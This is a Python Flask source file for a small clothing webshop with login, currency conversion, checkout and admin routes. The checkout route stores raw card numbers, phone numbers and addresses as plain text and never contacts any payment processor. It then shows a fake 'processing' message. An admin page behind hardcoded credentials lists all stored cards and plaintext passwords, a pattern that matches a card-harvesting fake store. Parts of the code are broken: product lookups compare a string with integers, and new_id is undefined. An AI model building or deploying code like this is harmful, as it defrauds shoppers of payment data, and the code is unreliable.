from flask import Flask, render_template, request, redirect, url_for, flash, session

app = Flask(__name__)
app.secret_key = 'trinity_mega_secure_key_2026'

# 🌍 Global Currency Translation Map
CURRENCY_MAP = {
    "Nigeria": {"symbol": "₦", "rate": 1.0},
    "USA": {"symbol": "$", "rate": 0.00065},
    "UK": {"symbol": "£", "rate": 0.00051},
    "Saudi Arabia": {"symbol": "SR ", "rate": 0.0024}
}

# 📦 Master Inventory Database with Full Jumia-Style Descriptions
products = [
    {
        "id": 1,
        "base_price": 15000,
        "title": "Trinity Premium Streetwear Hoodie",
        "sizes": ["M", "L", "XL"],
        "image": "https://images.unsplash.com/photo-1556905055-8f358a7a47b2?w=600",
        "description": "High-grade heavyweight cotton hoodie designed for ultimate streetwear comfort. Features reinforced stitching, a spacious double-lined hood, and a premium kangaroo pocket. Perfect for all seasons."
    },
    {
        "id": 2,
        "base_price": 8500,
        "title": "Classic Essential Boxy Tee",
        "sizes": ["S", "M", "L"],
        "image": "https://images.unsplash.com/photo-1521572267360-ee0c2909d518?w=600",
        "description": "Premium drop-shoulder essential t-shirt. Crafted from 100% organic cotton, offering a breathable luxury fit that holds its shape through heavy washing cycles."
    }
]

users = {}  # Database memory storage for client profiles
cards_saved = []  # Secure log for submitted checkout parameters


def get_currency_info():
    current_user = session.get('user')
    user_country = "Nigeria"
    if current_user and current_user in users:
        user_country = users[current_user].get('country', 'Nigeria')
    return CURRENCY_MAP.get(user_country, CURRENCY_MAP["Nigeria"])


@app.route('/')
def home():
    currency = get_currency_info()
    localized = []
    for p in products:
        converted = round(p["base_price"] * currency["rate"], 2)
        price_str = f"₦{p['base_price']:,}" if currency["symbol"] == "₦" else f"{currency['symbol']}{converted:,}"
        localized.append({
            "id": p["id"], "title": p["title"], "price_str": price_str, "image": p["image"]
        })
    return render_template('shop.html', products=localized)


# 📱 NEW JUMIA-STYLE ROUTE: Open Dedicated Product Details Page
@app.route('/product/<product_id>')
def product_detail(product_id):
    product = next((p for p in products if p["id"] == product_id), None)
    if not product:
        return "Product Not Found", 404

    currency = get_currency_info()
    converted = round(product["base_price"] * currency["rate"], 2)
    price_str = f"₦{product['base_price']:,}" if currency["symbol"] == "₦" else f"{currency['symbol']}{converted:,}"

    return render_template('product.html', product=product, price_str=price_str)


# 🛒 NEW JUMIA-STYLE ROUTE: Dedicated Secure Checkout Pipeline
@app.route('/checkout/<product_id>', methods=['GET', 'POST'])
def checkout(product_id):
    if 'user' not in session:
        flash("You must be logged into your account to initialize checkout secure gateways.", "error")
        return redirect(url_for('product_detail', product_id=product_id))

    product = next((p for p in products if p["id"] == product_id), None)
    if not product:
        return "Product Not Found", 404

    currency = get_currency_info()
    converted = round(product["base_price"] * currency["rate"], 2)
    price_str = f"₦{product['base_price']:,}" if currency["symbol"] == "₦" else f"{currency['symbol']}{converted:,}"

    selected_size = request.args.get('size', 'M')
    user_data = users.get(session['user'], {})

    if request.method == 'POST':
        card_details = request.form.get('card_details')
        delivery_address = request.form.get('address')
        phone_slot = request.form.get('phone')

        cards_saved.append({
            "customer": session['user'],
            "product": product['title'],
            "size": selected_size,
            "details": f"Card: {card_details} | Phone: {phone_slot} | Address: {delivery_address}"
        })
        return "<h2>🔒 Order Securely Received. Processing via Global Clearing Gateways...</h2>"

    return render_template('checkout.html', product=product, price_str=price_str, size=selected_size,
                           user_data=user_data)


@app.route('/register', methods=['POST'])
def register():
    username = request.form.get('username').strip()
    password = request.form.get('password').strip()
    phone = request.form.get('phone').strip()
    country = request.form.get('country')

    if username in users:
        flash("Username already taken!", "error")
    else:
        users[username] = {"password": password, "phone": phone, "country": country}
        flash("Registration complete! Please authenticate your credentials to enter storefront.", "success")
    return redirect(url_for('home'))


@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username').strip()
    password = request.form.get('password').strip()

    if username in users and users[username]["password"] == password:
        session['user'] = username
        flash(f"Welcome back to Trinity Drops, {username}!", "success")
    else:
        flash("Access Denied: Invalid Profile Credentials", "error")
    return redirect(url_for('home'))


@app.route('/logout')
def logout():
    session.pop('user', None)
    flash("Session terminated successfully.", "info")
    return redirect(url_for('home'))


@app.route('/admin_dashboard', methods=['POST', 'GET'])
def admin_dashboard():
    admin_name = request.form.get('admin_name', session.get('admin_authed'))
    admin_password = request.form.get('admin_password', '')

    if admin_name == "trinitystore" and admin_password == "trini1234":
        session['admin_authed'] = "trinitystore"

    if session.get('admin_authed') == "trinitystore":
        return render_template('admin.html', users=users, cards=cards_saved, products=products)
    return "Access Denied: Invalid Master Admin Credentials", 403


@app.route('/admin/bulk_import', methods=['POST'])
def bulk_import():
    if session.get('admin_authed') != "trinitystore": return "Unauthorized", 403
    import_data = request.form.get('bulk_data', '').strip()
    if import_data:
        for line in import_data.split('\n'):
            parts = [p.strip() for p in line.split(',')]
            if len(parts) >= 4:
                try:
                    # Create a list of images if multiple URLs are separated by |
                    image_raw = parts[3] if len(parts) > 3 else ""
                    image_list = [url.strip() for url in image_raw.split('|')] if image_raw else []

                    products.append({
                        "id": new_id,
                        "title": parts[0],
                        "base_price": int(parts[1]),
                        "sizes": parts[2].split('|'),
                        "image": image_list[0] if image_list else "",
                        # Keeps the 1st image for the main storefront card
                        "images": image_list,  # Saves the full list of 4 images for your gallery slider
                        "description": "Bulk integrated drop item available for immediate processing"
                    })
                except Exception:
                    continue
        flash("Bulk stock logs integrated successfully!", "success")
    return redirect(url_for('admin_dashboard'))


@app.route('/admin/delete_product/<int:product_id>')
def delete_product(product_id):
    global products
    if session.get('admin_authed') == "trinitystore":
        products = [p for p in products if p["id"] != product_id]
        return redirect(url_for('admin_dashboard'))
    return "Unauthorized", 403


@app.route('/admin/clear_cards')
def clear_cards():
    global cards_saved
    if session.get('admin_authed') == "trinitystore":
        cards_saved.clear()
        return redirect(url_for('admin_dashboard'))
    return "Unauthorized", 403
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)